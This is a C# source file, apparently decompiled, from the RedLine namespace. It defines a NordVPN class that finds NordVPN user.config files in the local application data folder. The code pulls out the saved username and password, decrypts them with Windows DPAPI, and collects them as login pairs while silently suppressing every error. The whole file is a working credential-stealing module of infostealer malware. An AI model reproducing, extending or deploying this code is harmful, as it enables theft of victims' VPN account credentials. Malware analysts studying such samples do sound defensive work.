using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;
using RedLine.Logic.Helpers;
using RedLine.Models;

namespace RedLine.Client.Logic.Others
{
	// Token: 0x0200003E RID: 62
	public static class NordVPN
	{
		// Token: 0x0600019B RID: 411 RVA: 0x0000557C File Offset: 0x0000377C
		public static List<LoginPair> GetProfile()
		{
			List<LoginPair> list = new List<LoginPair>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Constants.LocalAppData, "NordVPN"));
				if (!directoryInfo.Exists)
				{
					return list;
				}
				DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
				for (int i = 0; i < directories.Length; i++)
				{
					foreach (DirectoryInfo directoryInfo2 in directories[i].GetDirectories())
					{
						try
						{
							string text = Path.Combine(directoryInfo2.FullName, "user.config");
							if (File.Exists(text))
							{
								XmlDocument xmlDocument = new XmlDocument();
								xmlDocument.Load(text);
								string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
								string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
								if (!string.IsNullOrWhiteSpace(innerText) && !string.IsNullOrWhiteSpace(innerText2))
								{
									string @string = Encoding.UTF8.GetString(DecryptHelper.DecryptBlob(Convert.FromBase64String(innerText), DataProtectionScope.LocalMachine, null));
									string string2 = Encoding.UTF8.GetString(DecryptHelper.DecryptBlob(Convert.FromBase64String(innerText2), DataProtectionScope.LocalMachine, null));
									if (!string.IsNullOrWhiteSpace(@string) && !string.IsNullOrWhiteSpace(string2))
									{
										list.Add(new LoginPair
										{
											Login = @string,
											Password = string2
										});
									}
								}
							}
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}
	}
}
